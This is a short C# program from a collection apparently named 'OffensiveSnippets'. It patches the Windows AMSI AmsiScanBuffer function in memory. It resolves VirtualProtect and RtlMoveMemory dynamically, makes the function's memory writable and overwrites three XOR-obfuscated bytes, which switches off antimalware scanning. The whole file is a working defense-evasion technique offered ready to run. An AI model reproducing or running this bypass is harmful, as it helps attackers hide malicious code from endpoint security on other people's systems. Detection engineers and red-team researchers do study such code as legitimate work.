using System;
using DInvoke.DynamicInvoke;
using System.Runtime.InteropServices;

namespace OffensiveSnippets
{
    class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect
        );
        delegate void RtlMoveMemory(IntPtr dest, IntPtr src, int size);

        static void AMSIpatch()
        {
            var addressVirtualProtect = Generic.GetLibraryAddress("kernel32.dll", "VirtualProtect");
            var VirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(
                addressVirtualProtect,
                typeof(VirtualProtect)
            );

            var addressRtlMoveMemory = Generic.GetLibraryAddress("kernel32.dll", "RtlMoveMemory");
            var RtlMoveMemory = (RtlMoveMemory)Marshal.GetDelegateForFunctionPointer(
                addressRtlMoveMemory,
                typeof(RtlMoveMemory)
            );

            Console.WriteLine("[-] Patching AMSI");

            Console.WriteLine("\t[>] Search by name -> AmsiScanBuffer");
            IntPtr AmsiScanBufferAddress = Generic.GetLibraryAddress(
                "amsi.dll",
                "AmsiScanBuffer",
                true
            );
            Console.WriteLine(
                "\t[>] AmsiScanBuffer : " + string.Format("{0:X}", AmsiScanBufferAddress.ToInt64())
            );

            UIntPtr dwSize = (UIntPtr)4;
            uint Zero = 0;
            if (!VirtualProtect(AmsiScanBufferAddress, dwSize, 0x40, out Zero))
            {
                Environment.Exit(0);
            }
            byte[] buf = { 0xcb, 0x05, 0x6a };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(buf, 0, unmanagedPointer, 3);
            RtlMoveMemory(AmsiScanBufferAddress + 0x001b, unmanagedPointer, 3);
            Console.WriteLine("\t[+] AMSI patched.");
        }

        static void Main(string[] args)
        {
            AMSIpatch();
            Console.WriteLine("[*] Pausing..");
            Console.ReadLine();
        }
    }
}
